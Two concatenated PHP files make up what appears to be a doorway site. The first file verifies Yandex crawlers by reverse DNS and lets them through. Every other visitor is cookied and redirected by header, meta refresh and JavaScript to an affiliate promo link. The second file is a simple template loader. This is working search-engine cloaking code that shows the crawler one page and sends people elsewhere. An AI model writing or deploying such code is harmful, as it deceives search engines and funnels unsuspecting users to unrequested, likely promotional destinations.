<?php
$configRed = [];
$configRed["new_domain"] = "https://partners7k-promo.com/l/67d9467dce1a6a1a5a0494d7?sub_id=Dmellstroy77";
$configRed["second_domain"] = "https://partners7k-promo.com/l/67d9467dce1a6a1a5a0494d7?sub_id=Dmellstroy77";

function hasVisited() {
    return isset($_COOKIE['visited_before']) && $_COOKIE['visited_before'] === '1';
}

function gethostbynamelv6_($host) {
  $dns = dns_get_record($host);
  foreach ($dns as $record) {
    if ($record["type"] == "A") {
      return $record["ip"];
    }
    if ($record["type"] == "AAAA") {
      $res = str_replace("::", ":0:", $record["ipv6"]);
      return $res;
    }
  }
}

function checking_search($ip){
  $domain = gethostbyaddr($ip);
  $dns = gethostbynamelv6_($domain) ?: gethostbyname($domain);
  if ($dns != $ip)
    return false;

  list($x1,$x2) = explode('.',strrev($domain));
  $xdomain = $x1 . '.' . $x2;
  $xdomain = strrev($xdomain);

  if ($xdomain == "yandex.com" || $xdomain == "yandex.net")
    return true;
  else
    return false;
}

function get_ip_() {
    return $_SERVER['REMOTE_ADDR'] ?? '';
}

function handleRequest($config) {
  
  $checking_search = false;
   
  if (stripos($_SERVER['HTTP_USER_AGENT'], "YTranslate") === false && stripos($_SERVER['HTTP_USER_AGENT'], "Yandex") !== false){
    $ip               = get_ip_();
    $checking_search       = checking_search($ip);
  }

  if (!$checking_search){
    
     // Проверяем наличие куки
    if (hasVisited()) {
      // Если куки есть, редирект на вторую ссылку
      header('HTTP/1.1 301 Moved Permanently');
      header("Location: " . $config["second_domain"]);
      exit();
    } else {
      // Если куки нет, устанавливаем её и сразу делаем редирект
      setcookie('visited_before', '1', time() + (30 * 24 * 60 * 60), '/', '', false, true);
      
      // Используем JavaScript для гарантированного редиректа
      echo '<!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="UTF-8">
        <meta http-equiv="refresh" content="0;url=' . $config["new_domain"] . '">
        <script>
          window.location.href = "' . $config["new_domain"] . '";
        </script>
      </head>
      <body>
        <p>If you are not redirected, <a href="' . $config["new_domain"] . '">click here</a>.</p>
      </body>
      </html>';
      exit();
    }
  }
}

handleRequest($configRed);
?>
<?php
// Подключаем конфигурационный файл
require_once("config.php");

// Проверяем, существует ли указанный шаблон и загружаем соответствующие файлы
$templatePath = "templates/{$catalog}/{$template}";
$assetsPath = "/templates/{$catalog}/{$template}"; // Динамический путь к папке ассетов


// Проверяем, существует ли папка с шаблоном
if (is_dir($templatePath)) {
    // Подключаем header, content и footer из папки выбранного шаблона
    require_once("{$templatePath}/header.php");
} else {
    // Если указанной папки нет, можно загрузить шаблон по умолчанию или выдать ошибку
    echo "Ошибка: Шаблон не найден.";
}
?>
<div class="container">
    <?php
    // Подключаем основной контент
    if (file_exists("{$templatePath}/content.php")) {
        require_once("{$templatePath}/content.php");
    } else {
        echo "Ошибка: Файл content.php не найден.";
    }
    ?>
</div>
<?php
// Подключаем footer
if (file_exists("{$templatePath}/footer.php")) {
    require_once("{$templatePath}/footer.php");
} else {
    echo "Ошибка: Файл footer.php не найден.";
}
?>
